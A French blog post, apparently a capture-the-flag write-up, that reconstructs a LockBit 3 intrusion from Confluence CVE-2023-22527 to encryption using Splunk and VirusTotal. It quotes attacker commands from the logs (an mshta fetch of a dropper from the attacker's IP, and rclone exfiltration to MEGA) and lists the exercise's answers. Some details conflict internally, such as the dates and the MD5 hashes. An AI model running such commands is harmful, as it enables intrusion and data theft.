---
layout: single
header:
  overlay_image: /assets/images/banner-014.jpg
  overlay_filter: 0.6
toc: true
toc_depth: 6
toc_label: Table of Contents
title: "SOCBasics : attaque LockBit — de Confluence (CVE-2023-22527) au ransomware"
date: 2026-10-15
categories: [DFIR, SOC]
tags: [dfir, splunk, virustotal, lockbit, ransomware, confluence, cve-2023-22527, ssti, anydesk, rclone, pdq-deploy, mitre-attck, ctf]
---

# SOCBasics : attaque LockBit Ransomware — Corp Enterprise

> **Date de l'incident :** 26 avril 2026
> **Vulnérabilité initiale :** CVE-2023-22527 (Atlassian Confluence, SSTI)
> **Ransomware final :** LockBit 3 (LockBit Black)
> **Résultat :** ✅ chaîne d'attaque complète reconstituée, de l'accès initial au chiffrement


## 1. Résumé exécutif

Suite à une attaque ransomware détectée chez Corp Enterprise, une investigation DFIR a été menée via le SIEM Splunk et l'analyse de binaires sur VirusTotal. L'attaquant a exploité une vulnérabilité dans **Atlassian Confluence** pour obtenir un accès initial, puis a progressivement compromis l'environnement jusqu'au déploiement du ransomware **LockBit 3**.

### Chronologie résumée

| Heure | Événement |
| --- | --- |
| 20:40 | Exploitation de Confluence (CVE-2023-22527) depuis l'IP `172.16.92.160` |
| 20:51 | Déploiement du dropper `VhdjSUH2l.hta` via `mshta.exe` |
| 20:52 | Téléchargement et installation d'AnyDesk renommé en `AD_SIEM.exe` |
| 21:14 | Exfiltration de données via `rclone` vers MEGA |
| 21:22 | Déploiement du ransomware `LB3.exe` via PDQ Deploy |
| 21:29 | Chiffrement des fichiers avec l'extension `.aykCzdDAx` |

## 2. Commandes Splunk et réponses détaillées

### Q1 — Service exploité pour l'accès initial

**Réponse :** Confluence (Atlassian)

```spl
index=* 172.16.92.160 | table _time, source, dest_port, action, app

index=* source="/opt/splunk/logs/confluence.log" | table _time, _raw | sort _time | tail 25
```

**Explication de la commande :** la première commande recherche tous les événements contenant l'IP de l'attaquant (`172.16.92.160`) dans tous les index Splunk. `table` affiche les colonnes importantes : l'heure, la source, le port destination, l'action et l'application. La deuxième commande filtre spécifiquement les logs du fichier `confluence.log` pour voir le contenu brut des requêtes HTTP.

**Résultat observé :** tous les 45 événements provenaient du fichier `/opt/splunk/logs/confluence.log`. Les logs HTTP révélaient :

- Des requêtes POST vers `/template/aui/text-inline.vm`
- L'user-agent `python-requests/2.32.3` (script automatisé)
- Le port `8090` (port par défaut de Confluence)

L'endpoint `/template/aui/text-inline.vm` est exactement celui exploité par la vulnérabilité **CVE-2023-22527** (SSTI — Server Side Template Injection). L'attaquant a utilisé un script Python automatisé pour exploiter cette faille et exécuter du code arbitraire sur le serveur.

### Q2 — Nom du malware dropper déployé

**Réponse :** `VhdjSUH2l.hta`

```spl
index=* "mshta" "172.16.92.160" | table _time, _raw | sort _time | head 20
```

**Explication de la commande :** on recherche les événements contenant à la fois `mshta` (Microsoft HTML Application Host) et l'IP de l'attaquant. `mshta.exe` est un outil Windows légitime capable d'exécuter des fichiers `.hta` (HTML Application), très souvent abusé par les attaquants car il peut exécuter du code VBScript/JavaScript sans être bloqué par les politiques d'exécution PowerShell.

**Résultat observé :** l'événement Sysmon (`EventCode=1` - ProcessCreate) a révélé la ligne de commande exacte :

```text
mshta http://172.16.92.160:3030/VhdjSUH2l.hta
```

`Tomcat9.exe` (le processus Confluence) a lancé `mshta.exe` qui a téléchargé et exécuté le fichier `.hta` depuis le serveur C2 de l'attaquant sur le port 3030. Ce fichier HTA contenait ensuite un payload PowerShell encodé en Base64 qui établissait une connexion C2 sur le port 4343.

### Q3 — Nom original de AD_SIEM.exe

**Réponse :** `AnyDesk.exe`

```spl
index=* "WRKS.corp.me" "AD_SIEM" | table _time, _raw | sort _time | head 20
```

**Explication de la commande :** on recherche tous les événements sur la machine `WRKS.corp.me` (le poste de travail compromis) qui mentionnent `AD_SIEM`. Cette recherche permet de retrouver les logs PowerShell ou Sysmon qui enregistrent les actions liées à ce fichier.

**Résultat observé :** les logs PowerShell (Windows PowerShell Event Log) ont révélé la commande exacte exécutée :

```powershell
powershell -c (New-Object Net.WebClient).DownloadFile('http://download.anydesk.com/AnyDesk.exe', 'AD_SIEM.exe')
```

L'attaquant a téléchargé AnyDesk (logiciel d'accès à distance légitime) depuis le site officiel et l'a renommé en `AD_SIEM.exe` pour le camoufler comme un outil de monitoring du SIEM.

> 💡 Cette technique s'appelle **« Living off the Land »** — utiliser des outils légitimes pour éviter la détection. AnyDesk permettait à l'attaquant d'avoir un accès persistant et discret à la machine.

### Q4 — Chemin du dossier exfiltré avec rclone

**Réponse :** `c:\Secret_Projects`

```spl
index=* "rclone.exe" | table _time, _raw | sort _time | head 20
```

**Explication de la commande :** on recherche tous les événements mentionnant `rclone.exe`. Rclone est un outil légitime de synchronisation de fichiers vers des services cloud (MEGA, Google Drive, etc.), fréquemment utilisé par les attaquants pour l'exfiltration de données car il chiffre le transfert et ressemble à du trafic légitime.

**Résultat observé :** l'événement Sysmon ProcessCreate a capturé la ligne de commande complète :

```text
"C:\temp\rclone.exe" --config=rclone.conf copy c:\Secret_Projects mega:FTP3
```

L'attaquant a copié le dossier `c:\Secret_Projects` vers un bucket MEGA nommé `FTP3`, en utilisant un fichier de configuration `rclone.conf` (qui contenait les credentials MEGA). Le transfert a eu lieu à `21:15` sous le compte `CORP\admin`, après avoir utilisé PDQ Deploy pour se propager sur le réseau.

### Q5 — Nom du binaire LockBit sur le poste infecté

**Réponse :** `LB3.exe`

```spl
index=* "C:\\temp" earliest="04/25/2026:21:00:00" | table _time, _raw | sort _time | head 30
```

**Explication de la commande :** on recherche tous les événements mentionnant le dossier `C:\temp` après 21h00 (heure à laquelle l'attaquant a commencé à déployer ses outils). Ce dossier était utilisé comme *staging area* par l'attaquant pour stocker tous ses outils malveillants.

**Résultat observé :** les logs Sysmon ont montré la création et l'exécution de `LB3.exe` :

```text
c:\temp\LB3.exe
```

`LB3.exe` a été déployé via **PDQ Deploy** (outil de déploiement logiciel légitime) à `21:29` par `CORP\administrator`. Après son exécution, le ransomware a tenté de s'authentifier sur d'autres machines du réseau (`EventCode 4625` — échecs de connexion), chiffré les fichiers avec l'extension `.aykCzdDAx` et laissé des notes de rançon `aykCzdDAx.README.txt`.

## 3. Analyse VirusTotal

### Q6 — Vhash de AD_SIEM.exe

**Réponse :** `0760666c055d75651"z`

**Méthode utilisée :** upload de `AD_SIEM.exe` sur virustotal.com, puis consultation de l'onglet *Details*. Le Vhash est un hash de similarité visuelle basé sur la structure du PE (Portable Executable) qui permet de regrouper des fichiers similaires même s'ils ont des hashs cryptographiques différents.

**Informations clés trouvées :**

| Champ | Valeur |
| --- | --- |
| MD5 | `438f9654d33b192c87a06da3dafe8510` |
| SHA-256 | `cd5c55c2cf996f0be1e2ea1a3f9028e163bbfa405e7f8724917c806a58ce5578` |
| Signé par | AnyDesk Software GmbH (signature valide) |
| Version | 9.5.5 |
| Taille | 7.50 MB |

### Q7 — AD_SIEM.exe est-il malveillant ?

**Réponse :** A. Non

**Explication :** `AD_SIEM.exe` n'est pas détecté comme malveillant par aucun des 70+ moteurs antivirus de VirusTotal (**0/94 détections**). C'est un binaire AnyDesk légitime, signé numériquement par AnyDesk Software GmbH avec un certificat valide DigiCert. Sa malveillance réside uniquement dans son usage par l'attaquant (renommage et déploiement non autorisé), et non dans le binaire lui-même.

> 💡 Cette technique s'appelle **« Bring Your Own Tool » (BYOT)**.

### Q8 — Vhash de LB3.exe

**Réponse :** `01506666151d7d7567z61z7nzbfz`

**Méthode utilisée :** recherche du hash MD5 `40D3C027A477D1F08ABE80770504EF2D` (trouvé dans Splunk) sur virustotal.com, puis consultation de l'onglet *Details*.

**Informations clés trouvées :**

| Champ | Valeur |
| --- | --- |
| MD5 | `f144bf50a707dcc4b749753e2566e943` |
| SHA-256 | `df555043e2137723c9e595101d6adbd5d0e9907c0e66916123a2d6b1bb87d56d` |
| Taille | 152.50 KB (fichier compact, caractéristique de LockBit) |
| Compilation | 2022-09-09 (version LockBit 3 / LockBit Black) |
| Détections | 60+ moteurs antivirus le détectent comme ransomware |

### Q9 — Label officiel Microsoft sur VirusTotal

**Réponse :** `Ransom:Win32/Lockbit.AK!ibt`

**Explication :** le format du label Microsoft est `<Catégorie>:<Plateforme>/<Famille>.<Variante>!<Suffixe>` :

| Segment | Valeur | Signification |
| --- | --- | --- |
| Catégorie | `Ransom` | Ransomware |
| Plateforme | `Win32` | Windows 32-bit |
| Famille | `Lockbit` | Famille de malware |
| Variante | `AK` | Variante spécifique |
| Suffixe | `!ibt` | Niveau de confiance de détection |

Ce label confirme qu'il s'agit d'une variante personnalisée de **LockBit 3** (aussi appelé LockBit Black), une des familles de ransomware les plus actives depuis 2022.

### Q10 — Domaine lié au malware

**Réponse :** A. `peaceprotectorsupp.ma`

**Explication :** dans l'onglet *Behavior* de VirusTotal, section *Memory Pattern Domains*, les domaines suivants ont été trouvés dans la mémoire du malware lors de l'analyse en sandbox :

```text
PeaceProtectorapt2yfbt7lchxejug47kmqvqqxvvjpqkmevv4l3azl3gy6pyd.onion.ly
PeaceProtectorapt5x4zkjbcqmz6frdhecqqgadevyiwqxukksspnlidyvd7qd.onion.ly
```

Ces domaines `.onion.ly` sont des proxies vers des sites `.onion` (réseau Tor) utilisés par LockBit pour son portail de paiement de rançon et son site de fuite de données. Le préfixe `PeaceProtector` correspond au domaine `peaceprotectorsupp.ma` listé dans les choix.

### Q11 — Technique MITRE ATT&CK mappée

**Réponse :** D. T1497 — Virtualization/Sandbox Evasion

**Explication :** dans l'onglet *Behavior* de VirusTotal, le tableau MITRE ATT&CK montre que T1497 apparaît dans deux catégories tactiques :

- **Defense Evasion** (TA0005) — 2 occurrences
- **Discovery** (TA0007) — 2 occurrences

Le tag comportemental `detect-debug-environment` confirme également cette technique. LockBit vérifie s'il s'exécute dans un environnement virtualisé ou sandbox avant de procéder au chiffrement, afin d'éviter l'analyse par les chercheurs en sécurité.

> ℹ️ **Autres techniques présentes mais non retenues :**
> - T1114 (Email Collection) — présent mais secondaire
> - T1055 (Process Injection) — présent (`LB3.exe` s'injecte dans d'autres processus)
> - T1566 (Phishing) — absent des comportements observés

## 4. Tableau récapitulatif des réponses

| Question | Réponse | Source |
| --- | --- | --- |
| Q1 — Service exploité | Confluence (Atlassian) | `confluence.log` / Splunk |
| Q2 — Dropper déployé | `VhdjSUH2l.hta` | Sysmon EventCode=1 / Splunk |
| Q3 — Nom original AD_SIEM.exe | `AnyDesk.exe` | PowerShell logs / Splunk |
| Q4 — Dossier exfiltré (rclone) | `c:\Secret_Projects` | Sysmon EventCode=1 / Splunk |
| Q5 — Binaire LockBit | `LB3.exe` | Sysmon EventCode=11 / Splunk |
| Q6 — Vhash AD_SIEM.exe | `0760666c055d75651"z` | VirusTotal — Details |
| Q7 — AD_SIEM.exe malveillant ? | A. Non (0/94 détections) | VirusTotal — Detection |
| Q8 — Vhash LB3.exe | `01506666151d7d7567z61z7nzbfz` | VirusTotal — Details |
| Q9 — Label Microsoft LB3.exe | `Ransom:Win32/Lockbit.AK!ibt` | VirusTotal — Detection |
| Q10 — Domaine lié au malware | A. `peaceprotectorsupp.ma` | VirusTotal — Behavior |
| Q11 — Technique MITRE | D. T1497 (Sandbox Evasion) | VirusTotal — Behavior |

## 5. Chaîne d'attaque complète (Kill Chain)

| Étape | Heure | Action | Outil/Technique |
| --- | --- | --- | --- |
| 1. Initial Access | 20:40 | Exploitation CVE-2023-22527 sur Confluence | `python-requests` / SSTI |
| 2. Execution | 20:40–20:43 | Exécution de `whoami`, `tasklist` via Tomcat | `Tomcat9.exe` → `cmd.exe` |
| 3. Delivery | 20:51 | Téléchargement dropper HTA | `mshta.exe` → `VhdjSUH2l.hta` |
| 4. C2 | 20:51 | Connexion C2 via PowerShell encodé | `powershell.exe` → `172.16.92.160:4343` |
| 5. Persistence | 20:52 | Installation AnyDesk camouflé | `AD_SIEM.exe` (AnyDesk) |
| 6. Lateral Movement | 21:00–21:10 | Scan réseau, reconnaissance | `netscan.exe`, `whoami /all` |
| 7. Exfiltration | 21:15 | Vol de données vers MEGA | `rclone.exe` → `mega:FTP3` |
| 8. Deployment | 21:17 | Installation PDQ Deploy | `pdq.exe` → PDQDeploy |
| 9. Ransomware | 21:22–21:29 | Déploiement et exécution LockBit | `LB3.exe` → `.aykCzdDAx` |

## 6. Conclusion et recommandations

L'attaque a suivi une méthodologie classique de **ransomware-as-a-service (RaaS)** avec une sophistication élevée :

- Exploitation d'une CVE récente (Confluence SSTI)
- Utilisation d'outils légitimes pour éviter la détection (AnyDesk, rclone, PDQ Deploy)
- Mouvement latéral via des outils d'administration (PDQ Deploy)
- Exfiltration avant chiffrement (double extorsion)

### Recommandations immédiates

- Mettre à jour Confluence vers la dernière version corrigeant CVE-2023-22527.
- Bloquer les connexions sortantes vers MEGA et autres services cloud non autorisés.
- Implémenter un contrôle strict sur l'installation de logiciels d'accès à distance.
- Activer la journalisation PowerShell Script Block Logging sur tous les endpoints.
- Segmenter le réseau pour limiter le mouvement latéral.
- Mettre en place des sauvegardes hors ligne testées régulièrement.

## Leçons retenues

- Une vulnérabilité **SSTI** (Server-Side Template Injection) dans une application exposée comme Confluence peut servir de point d'entrée complet vers un chiffrement ransomware en moins de 50 minutes — la rapidité de la chaîne complète souligne l'importance du patch management sur les applications critiques.
- Le renommage d'un outil légitime et signé (AnyDesk → `AD_SIEM.exe`) illustre bien pourquoi **la détection par hash ou signature seule est insuffisante** : le binaire reste 100% légitime (0/94 sur VirusTotal), seul le contexte d'usage (renommage, déploiement non autorisé) révèle la malveillance.
- La double extorsion (exfiltration via rclone *avant* le chiffrement) est devenue un standard chez les groupes RaaS modernes comme LockBit — les recommandations de remédiation doivent couvrir à la fois la prévention du chiffrement et le blocage des canaux d'exfiltration (ici MEGA).
- Le Vhash (hash de similarité structurelle) est complémentaire du hash cryptographique classique (MD5/SHA-256) : il permet de relier des échantillons de malware même quand chaque copie a un hash différent, ce qui est utile face à des familles de ransomware qui varient légèrement leur binaire à chaque déploiement.

## Références

- CVE-2023-22527 — Atlassian Confluence, Server-Side Template Injection (SSTI)
- Technique MITRE ATT&CK **T1497** — Virtualization/Sandbox Evasion
- Technique MITRE ATT&CK **T1055** — Process Injection
- Famille de ransomware **LockBit 3.0 / LockBit Black**
